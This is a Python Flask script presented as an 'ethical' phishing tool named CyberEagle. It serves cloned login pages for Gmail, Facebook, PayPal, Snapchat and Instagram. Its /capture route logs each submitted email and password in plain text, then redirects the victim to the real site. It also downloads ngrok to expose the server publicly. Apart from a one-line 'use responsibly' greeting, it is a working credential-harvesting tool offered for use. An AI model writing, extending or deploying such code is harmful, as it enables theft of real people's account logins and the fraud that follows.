import os
import sys
import logging
import subprocess
from flask import Flask, render_template, request, redirect
from pyfiglet import Figlet  # For ASCII art text

# Initialize Flask app
app = Flask(__name__)

# Logging setup
logging.basicConfig(filename='phish.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Display CyberEagle banner
def display_banner():
    figlet = Figlet(font='slant')  # You can change the font (e.g., 'block', 'slant', 'script')
    banner = figlet.renderText('CyberEagle')
    print(banner)
    print("Advanced Ethical Phishing Tool\n")

# Phishing page routes
@app.route('/')
def home():
    return "Welcome to EthicalPhishTool. Use this tool responsibly!"

@app.route('/gmail')
def gmail_phish():
    return render_template('gmail.html')

@app.route('/facebook')
def facebook_phish():
    return render_template('facebook.html')

@app.route('/paypal')
def paypal_phish():
    return render_template('paypal.html')

@app.route('/snapchat')
def snapchat_phish():
    return render_template('snapchat.html')

@app.route('/instagram')
def instagram_phish():
    return render_template('instagram.html')

# Capture credentials
@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('password')
    logging.info(f"Captured credentials - Email: {email}, Password: {password}")
    return redirect('https://gmail.com')  # Redirect to the real site

# Start Ngrok
def start_ngrok(port):
    # Download Ngrok if not already present
    if not os.path.exists('ngrok'):
        print("Downloading Ngrok...")
        if sys.platform == 'linux':
            os.system('wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip')
            os.system('unzip ngrok-stable-linux-amd64.zip')
            os.system('rm ngrok-stable-linux-amd64.zip')
        elif sys.platform == 'darwin':  # macOS
            os.system('curl -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip')
            os.system('unzip ngrok-stable-darwin-amd64.zip')
            os.system('rm ngrok-stable-darwin-amd64.zip')
        else:
            print("Unsupported platform. Please download Ngrok manually.")
            sys.exit(1)

    # Start Ngrok
    print("Starting Ngrok...")
    ngrok_process = subprocess.Popen(['./ngrok', 'http', str(port)])
    print("Ngrok started. Check the terminal for the public URL.")
    return ngrok_process

# Run the app
if __name__ == '__main__':
    # Display CyberEagle banner
    display_banner()

    port = 5000

    # Start Ngrok
    ngrok_process = start_ngrok(port)

    # Start Flask app
    print("Starting Flask app...")
    app.run(host='0.0.0.0', port=port)